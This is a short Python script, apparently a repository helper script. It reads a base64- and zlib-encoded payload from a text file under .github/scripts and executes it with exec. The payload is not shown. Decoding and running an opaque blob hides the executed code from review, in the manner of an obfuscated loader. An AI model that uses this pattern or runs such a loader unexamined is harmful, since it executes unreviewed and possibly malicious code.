from pathlib import Path
import base64
import zlib

payload = Path('.github/scripts/final_rewrite_payload.txt').read_text(encoding='utf-8').strip()
code = zlib.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(code, '<apply_final_rewrite>', 'exec'))
